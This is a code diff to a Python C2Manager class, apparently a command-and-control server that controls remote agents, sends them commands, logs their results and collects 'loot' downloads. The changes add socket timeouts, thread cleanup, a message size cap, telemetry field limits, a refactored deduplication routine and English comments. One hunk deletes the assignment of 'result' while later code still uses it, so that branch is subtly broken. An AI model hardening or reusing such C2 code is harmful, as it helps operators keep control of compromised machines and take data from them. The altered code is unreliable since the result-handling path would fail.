@@ -612,6 +612,7 @@ class C2Manager:
             self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self._server_socket.bind((self.bind_ip, self.bind_port))
             self._server_socket.listen(128)
+            self._server_socket.settimeout(1.0)
 
             # Start accept thread
             self._running = True
@@ -631,6 +632,12 @@ class C2Manager:
 
         except Exception as e:
             self.logger.error(f"Failed to start C2 server: {e}")
+            if self._server_socket:
+                try:
+                    self._server_socket.close()
+                except Exception:
+                    pass
+                self._server_socket = None
             self._running = False
             return {"status": "error", "message": str(e)}
 
@@ -646,6 +653,12 @@ class C2Manager:
             if self._server_socket:
                 self._server_socket.close()
                 self._server_socket = None
+
+            if self._server_thread and self._server_thread.is_alive():
+                self._server_thread.join(timeout=3.0)
+                if self._server_thread.is_alive():
+                    self.logger.warning("C2 accept thread did not exit cleanly")
+            self._server_thread = None
 
             # Disconnect all clients
             with self._lock:
@@ -774,7 +787,7 @@ class C2Manager:
             for row in rows:
                 agent_id = row["id"]
 
-                # Conversion last_seen → timestamp ms
+                # Conversion last_seen -> timestamp ms
                 last_seen_raw = row.get("last_seen")
                 last_seen_epoch = None
                 if last_seen_raw:
@@ -803,7 +816,7 @@ class C2Manager:
                     "tags": []
                 }
 
-                # --- 2) Écraser si agent en mémoire (connecté) ---
+                # If connected in memory, prefer live telemetry values.
                 if agent_id in self._clients:
                     info = self._clients[agent_id]["info"]
                     agent_info.update({
@@ -816,10 +829,10 @@ class C2Manager:
                         "disk": info.get("disk_percent", 0),
                         "ip": info.get("ip_address", agent_info["ip"]),
                         "uptime": info.get("uptime", 0),
-                        "last_seen": int(datetime.utcnow().timestamp() * 1000),  # en ms
+                        "last_seen": int(datetime.utcnow().timestamp() * 1000),
                     })
 
-                # --- 3) Vérifier si trop vieux → offline ---
+                # Mark stale clients as offline.
                 if agent_info["last_seen"]:
                     delta = (now.timestamp() * 1000) - agent_info["last_seen"]
                     if delta > OFFLINE_THRESHOLD * 1000:
@@ -827,33 +840,30 @@ class C2Manager:
 
                 agents.append(agent_info)
 
-                # Déduplication par hostname (ou id fallback) : on garde le plus récent et on
-                # privilégie un statut online par rapport à offline.
-                dedup = {}
-                for a in agents:
-                    key = (a.get('hostname') or a['id']).strip().lower()
-                    prev = dedup.get(key)
-                    if not prev:
-                        dedup[key] = a
-                        continue
+            # Deduplicate by hostname (or id fallback), preferring healthier/recent entries.
+            dedup = {}
+            for a in agents:
+                key = (a.get("hostname") or a["id"]).strip().lower()
+                prev = dedup.get(key)
+                if not prev:
+                    dedup[key] = a
+                    continue
 
-                    def rank(status):  # online < idle < offline
-                        return {'online': 0, 'idle': 1, 'offline': 2}.get(status, 3)
+                def rank(status):
+                    return {"online": 0, "idle": 1, "offline": 2}.get(status, 3)
 
-                    better = False
-                    if rank(a['status']) < rank(prev['status']):
+                better = False
+                if rank(a["status"]) < rank(prev["status"]):
+                    better = True
+                else:
+                    la = a.get("last_seen") or 0
+                    lp = prev.get("last_seen") or 0
+                    if la > lp:
                         better = True
-                    else:
-                        la = a.get('last_seen') or 0
-                        lp = prev.get('last_seen') or 0
-                        if la > lp:
-                            better = True
-                    if better:
-                        dedup[key] = a
+                if better:
+                    dedup[key] = a
 
-                return list(dedup.values())
-
-            return agents
+            return list(dedup.values())
 
     def send_command(self, targets: List[str], command: str) -> dict:
         """Send command to specific agents"""
@@ -1060,6 +1070,8 @@ class C2Manager:
                         args=(sock, addr),
                         daemon=True
                     ).start()
+            except socket.timeout:
+                continue
             except OSError:
                 break  # Server socket closed
             except Exception as e:
@@ -1159,10 +1171,19 @@ class C2Manager:
 
     def _receive_from_client(self, sock: socket.socket, cipher: Fernet) -> Optional[dict]:
         try:
+            # OPTIMIZATION: Set timeout to prevent threads hanging forever
+            sock.settimeout(15.0)
+            
             header = sock.recv(4)
             if not header or len(header) != 4:
                 return None
             length = struct.unpack(">I", header)[0]
+            
+            # Memory protection: prevent massive data payloads
+            if length > 10 * 1024 * 1024:
+                self.logger.warning(f"Rejecting oversized message: {length} bytes")
+                return None
+
             data = b""
             while len(data) < length:
                 chunk = sock.recv(min(4096, length - len(data)))
@@ -1172,12 +1193,10 @@ class C2Manager:
             decrypted = cipher.decrypt(data)
             return json.loads(decrypted.decode())
         except (OSError, ConnectionResetError, BrokenPipeError):
-            # socket fermé/abandonné → None = déconnexion propre
             return None
         except Exception as e:
             self.logger.error(f"Receive error: {e}")
             return None
-
 
     def _send_to_client(self, client_id: str, command: str):
         with self._lock:
@@ -1190,8 +1209,6 @@ class C2Manager:
             encrypted = cipher.encrypt(command.encode())
             header = struct.pack(">I", len(encrypted))
             sock.sendall(header + encrypted)
-
-
 
     def _process_client_message(self, client_id: str, data: dict):
         with self._lock:
@@ -1212,16 +1229,17 @@ class C2Manager:
         elif 'telemetry' in data:
             telemetry = data['telemetry']
             with self._lock:
+                # OPTIMIZATION: Prune telemetry fields kept in-memory
                 client_info.update({
-                    'hostname': telemetry.get('hostname'),
-                    'platform': telemetry.get('platform'),
-                    'os': telemetry.get('os'),
-                    'os_version': telemetry.get('os_version'),
-                    'architecture': telemetry.get('architecture'),
-                    'cpu_percent': telemetry.get('cpu_percent', 0),
-                    'mem_percent': telemetry.get('mem_percent', 0),
-                    'disk_percent': telemetry.get('disk_percent', 0),
-                    'uptime': telemetry.get('uptime', 0)
+                    'hostname': str(telemetry.get('hostname', ''))[:64],
+                    'platform': str(telemetry.get('platform', ''))[:32],
+                    'os': str(telemetry.get('os', ''))[:32],
+                    'os_version': str(telemetry.get('os_version', ''))[:64],
+                    'architecture': str(telemetry.get('architecture', ''))[:16],
+                    'cpu_percent': float(telemetry.get('cpu_percent', 0)),
+                    'mem_percent': float(telemetry.get('mem_percent', 0)),
+                    'disk_percent': float(telemetry.get('disk_percent', 0)),
+                    'uptime': float(telemetry.get('uptime', 0))
                 })
             self.db.save_telemetry(client_id, telemetry)
             self.bus.emit({"type": "telemetry", "id": client_id, **telemetry})
@@ -1230,7 +1248,6 @@ class C2Manager:
             self._handle_loot(client_id, data['download'])
 
         elif 'result' in data:
-            result = data['result']
             # >>> ici on enregistre avec la vraie commande
             self.db.save_command(client_id, last_cmd or '<unknown>', result, True)
             self.bus.emit({"type": "console", "target": client_id, "text": str(result), "kind": "RX"})
@@ -1329,3 +1346,6 @@ class C2Manager:
 
 # ========== Global Instance ==========
 c2_manager = C2Manager()
+
+
+
